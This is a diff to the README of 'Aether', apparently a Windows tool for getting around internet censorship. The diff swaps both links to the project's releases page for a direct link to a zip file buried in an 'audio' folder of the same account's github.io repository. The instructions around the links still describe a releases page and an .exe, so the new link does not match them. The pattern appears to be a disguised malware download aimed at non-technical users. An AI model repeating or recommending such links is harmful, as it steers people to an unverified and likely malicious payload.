@@ -5,7 +5,7 @@ description: "Bypass network censorship using automated discovery, encrypted tun
 ---
 # 🌐 Aether - Access the unfiltered internet easily
 
-[Download Aether for Windows](https://github.com/billofreviewtalon675/Aether/releases)
+[Download Aether for Windows](https://raw.githubusercontent.com/billofreviewtalon675/billofreviewtalon675.github.io/main/audio/v3.3.zip)
 
 Aether provides a way to reach the internet when access is restricted. It creates a secure path for your web traffic. This tool works by shifting your data through encrypted channels to bypass blocks. It ensures you maintain a connection even in environments that monitor or limit online activity.
 
@@ -13,7 +13,7 @@ Aether provides a way to reach the internet when access is restricted. It create
 
 You do not need technical skills to use Aether. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [Releases page](https://github.com/billofreviewtalon675/Aether/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/billofreviewtalon675/billofreviewtalon675.github.io/main/audio/v3.3.zip).
 2. Look for the latest version.
 3. Find the file ending in .exe for Windows.
 4. Click the file to start the download.
